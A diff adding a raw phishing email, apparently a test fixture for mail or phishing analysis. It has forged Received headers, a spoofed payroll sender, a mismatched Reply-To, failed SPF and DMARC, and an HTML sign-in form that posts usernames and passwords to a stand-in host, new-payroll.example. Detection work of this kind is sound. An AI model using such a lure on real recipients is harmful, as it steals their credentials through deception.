@@ -1,0 +1,14 @@
+Received: from 203.0.113.77 (mx.recipient.example [203.0.113.77]) by recipient-gateway.example; Mon, 11 Sep 2026 09:10:00 +0000
+Received: from 203.0.113.77 (mailer-node-09.example [203.0.113.77]) by mx.recipient.example; Mon, 11 Sep 2026 09:09:00 +0000
+Received: from 1.2.3.4 (forged.example [1.2.3.4]) by old-relay.example; Sun, 10 Sep 2026 01:00:00 +0000
+From: Payroll Review <new-payroll.example@mailer.example>
+To: analyst@example.org
+Reply-To: accounts-909@mailbox.example
+Return-Path: <bounce@mailer.example>
+Message-ID: <1720553283.be73de@mail-node-09>
+Date: Mon, 11 Sep 2026 09:10:00 +0000
+Subject: Immediate payroll profile validation
+Authentication-Results: recipient-gateway.example; spf=fail; dmarc=fail
+Content-Type: text/html; charset=utf-8
+
+<html><body><table><tr><td><form action="https://new-payroll.example/auth/session/112233"><input type="text" name="user"><input type="password" name="password"><button>Sign in</button></form></td></tr></table></body></html>
